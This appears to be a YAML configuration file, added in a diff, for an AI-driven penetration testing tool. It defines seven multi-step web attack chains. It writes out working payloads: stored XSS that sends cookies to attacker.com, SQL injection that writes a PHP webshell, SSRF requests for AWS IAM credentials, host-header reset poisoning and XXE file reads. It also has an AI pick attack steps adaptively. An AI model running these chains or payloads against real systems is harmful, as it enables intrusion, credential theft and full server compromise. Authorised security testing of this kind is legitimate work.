@@ -1,0 +1,271 @@
+# Attack Chains & Multi-Step Exploitation Workflows
+# Combining vulnerabilities for maximum impact
+
+category: "workflows"
+type: "attack-chains"
+purpose: "Define multi-step attack sequences"
+
+# ===== ATTACK CHAIN DEFINITIONS =====
+
+# Chain 1: IDOR → XSS → Session Hijacking
+chain_idor_to_session_hijack:
+  name: "IDOR to Session Hijacking via Stored XSS"
+  severity: "CRITICAL"
+  steps:
+    - id: "step1"
+      vulnerability: "IDOR"
+      action: "Access another user's profile via user_id manipulation"
+      test_case: "IDOR-002"
+      payload: "GET /api/users/2/profile"
+      expected_result: "200 OK with user 2's data"
+      
+    - id: "step2"
+      vulnerability: "Stored XSS in profile"
+      action: "Inject XSS payload in victim's profile bio field"
+      test_case: "XSS-STORED-001"
+      payload: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
+      expected_result: "XSS stored in victim's profile"
+      
+    - id: "step3"
+      vulnerability: "Session Hijacking"
+      action: "Wait for admin to view victim's profile"
+      expected_result: "Admin session cookie stolen"
+      impact: "Full account takeover of admin user"
+
+# Chain 2: SQL Injection → File Write → RCE
+chain_sqli_to_rce:
+  name: "SQL Injection to Remote Code Execution"
+  severity: "CRITICAL"
+  steps:
+    - id: "step1"
+      vulnerability: "SQL Injection"
+      action: "Confirm SQLi with time-based payload"
+      payload: "id=1' AND SLEEP(5)--"
+      expected_result: "5 second delay"
+      
+    - id: "step2"
+      vulnerability: "File Write via SQLi"
+      action: "Write PHP webshell to web directory"
+      payload: "id=1' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
+      expected_result: "File written successfully"
+      
+    - id: "step3"
+      vulnerability: "Remote Code Execution"
+      action: "Execute commands via webshell"
+      payload: "GET /shell.php?cmd=whoami"
+      expected_result: "Command output returned"
+      impact: "Full server compromise"
+
+# Chain 3: Subdomain Takeover → Phishing
+chain_subdomain_phishing:
+  name: "Subdomain Takeover to Credential Phishing"
+  severity: "HIGH"
+  steps:
+    - id: "step1"
+      vulnerability: "Subdomain Takeover"
+      action: "Find dangling DNS record (old-app.example.com → deleted AWS S3)"
+      payload: "Create S3 bucket with same name"
+      expected_result: "Control over old-app.example.com"
+      
+    - id: "step2"
+      vulnerability: "Cookie Scope"
+      action: "Set cookie for .example.com domain from subdomain"
+      payload: "document.cookie='session=malicious; domain=.example.com'"
+      expected_result: "Cookie set for main domain"
+      
+    - id: "step3"
+      vulnerability: "Phishing"
+      action: "Host fake login page on subdomain"
+      payload: "https://old-app.example.com/login (fake page)"
+      expected_result: "Users trust subdomain, enter credentials"
+      impact: "Credential harvesting"
+
+# Chain 4: SSRF → Cloud Metadata → Privilege Escalation
+chain_ssrf_cloud_escalation:
+  name: "SSRF to Cloud Privilege Escalation"
+  severity: "CRITICAL"
+  platform: "AWS"
+  steps:
+    - id: "step1"
+      vulnerability: "SSRF"
+      action: "Access AWS metadata endpoint"
+      payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      expected_result: "IAM role name revealed"
+      
+    - id: "step2"
+      vulnerability: "IAM Credential Leak"
+      action: "Retrieve temporary credentials"
+      payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole"
+      expected_result: "AccessKeyId, SecretAccessKey, Token"
+      
+    - id: "step3"
+      vulnerability: "Privilege Escalation"
+      action: "Use credentials to access AWS resources"
+      payload: "aws s3 ls --profile stolen_creds"
+      expected_result: "Access to S3 buckets, databases, etc."
+      impact: "Cloud infrastructure compromise"
+
+# Chain 5: Race Condition → Privilege Escalation
+chain_race_to_admin:
+  name: "Race Condition to Admin Access"
+  severity: "HIGH"
+  steps:
+    - id: "step1"
+      vulnerability: "Race Condition"
+      action: "Send parallel requests to create admin user"
+      payload: "POST /admin/createUser (x100 parallel)"
+      expected_result: "Race condition bypasses single-admin check"
+      
+    - id: "step2"
+      vulnerability: "Privilege Escalation"
+      action: "Login with newly created admin account"
+      payload: "POST /login username=raceadmin&password=test123"
+      expected_result: "Admin session granted"
+      impact: "Full administrative access"
+
+# Chain 6: Password Reset Poisoning → Account Takeover
+chain_password_reset_takeover:
+  name: "Password Reset Token Poisoning"
+  severity: "HIGH"
+  steps:
+    - id: "step1"
+      vulnerability: "Host Header Injection"
+      action: "Manipulate password reset link"
+      payload: |
+        POST /forgot-password
+        Host: attacker.com
+        email=victim@example.com
+      expected_result: "Reset link points to attacker.com"
+      
+    - id: "step2"
+      vulnerability: "Token Theft"
+      action: "Victim clicks link, token sent to attacker"
+      expected_result: "Reset token captured: /reset?token=abc123"
+      
+    - id: "step3"
+      vulnerability: "Account Takeover"
+      action: "Use token on legitimate site"
+      payload: "POST /reset-password token=abc123&password=hacked123"
+      expected_result: "Password changed, account compromised"
+
+# Chain 7: XXE → SSRF → Internal Network Scan
+chain_xxe_network_recon:
+  name: "XXE to Internal Network Reconnaissance"
+  severity: "HIGH"
+  steps:
+    - id: "step1"
+      vulnerability: "XXE"
+      action: "Confirm XXE vulnerability"
+      payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+      expected_result: "File contents disclosed"
+      
+    - id: "step2"
+      vulnerability: "SSRF via XXE"
+      action: "Scan internal network"
+      payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22">]>'
+      expected_result: "Internal service responses"
+      
+    - id: "step3"
+      vulnerability: "Service Discovery"
+      action: "Enumerate internal services (Redis, Elasticsearch, etc.)"
+      expected_result: "Map internal network topology"
+      impact: "Internal infrastructure exposed"
+
+# ===== CHAINING STRATEGIES =====
+
+chaining_patterns:
+  information_disclosure_to_exploitation:
+    pattern: "Recon → Identify Vulnerability → Exploit → Escalate"
+    example: "Error Message → Stack Trace → Framework Version → Known CVE"
+    
+  horizontal_to_vertical_escalation:
+    pattern: "IDOR (horizontal) → Stored XSS → Admin Session (vertical)"
+    example: "Access user profile → Inject XSS → Steal admin cookie"
+    
+  blind_to_full_exploitation:
+    pattern: "Blind SQLi → Error-based → UNION → Data Extraction"
+    example: "Time delay → Error messages → Full query control"
+    
+  client_to_server_side:
+    pattern: "XSS → CSRF → Server-Side Action"
+    example: "Steal CSRF token → Execute privileged action"
+
+# ===== EXECUTION STRATEGY =====
+
+execution_rules:
+  sequential:
+    description: "Execute steps in order, each depends on previous"
+    use_when: "Steps have dependencies"
+    example: "Must find IDOR before exploiting it"
+    
+  parallel:
+    description: "Execute steps simultaneously"
+    use_when: "Steps are independent"
+    example: "Test multiple injection points at once"
+    
+  conditional:
+    description: "Execute next step only if condition met"
+    use_when: "Success of step determines next action"
+    example: "If SQLi succeeds, attempt file write"
+    
+  adaptive:
+    description: "AI chooses next step based on results"
+    use_when: "Multiple paths possible"
+    example: "If WAF detected, switch to bypass techniques"
+
+# ===== STOP CONDITIONS =====
+
+stop_conditions:
+  success:
+    - "Objective achieved (e.g., RCE obtained)"
+    - "Critical vulnerability confirmed"
+    - "Maximum impact reached"
+    
+  failure:
+    - "All payloads blocked by WAF"
+    - "No vulnerabilities found after N attempts"
+    - "Account locked out"
+    
+  safety:
+    - "Production environment detected (stop destructive chains)"
+    - "Rate limit exceeded"
+    - "Service disruption detected"
+
+# ===== IMPACT ASSESSMENT =====
+
+impact_levels:
+  critical:
+    - "Remote Code Execution"
+    - "Full database access"
+    - "Admin account takeover"
+    - "Cloud infrastructure compromise"
+    
+  high:
+    - "Sensitive data exfiltration"
+    - "User account takeover"
+    - "Privilege escalation"
+    
+  medium:
+    - "Information disclosure"
+    - "IDOR to non-sensitive data"
+    - "XSS (non-admin context)"
+
+# ===== REAL-WORLD EXAMPLES =====
+
+historical_chains:
+  capital_one_breach_2019:
+    chain: "SSRF → AWS Metadata → IAM Credentials → S3 Buckets"
+    impact: "100 million customer records stolen"
+    
+  equifax_breach_2017:
+    chain: "Apache Struts RCE → Network Traversal → Database Access"
+    impact: "147 million records compromised"
+    
+  solarwinds_2020:
+    chain: "Supply Chain → Code Injection → Privilege Escalation → Persistence"
+    impact: "Government and enterprise compromise"
+
+references:
+  - "MITRE ATT&CK"
+  - "Cyber Kill Chain"
+  - "OWASP Attack Chain Framework"
